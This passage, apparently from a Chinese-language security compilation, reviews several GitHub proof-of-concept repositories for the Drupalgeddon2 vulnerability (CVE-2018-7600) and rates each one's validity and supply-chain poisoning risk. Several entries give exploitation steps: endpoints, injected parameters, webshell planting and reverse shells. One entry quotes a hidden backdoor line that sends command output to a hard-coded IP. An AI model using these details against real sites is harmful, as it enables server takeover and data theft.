2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
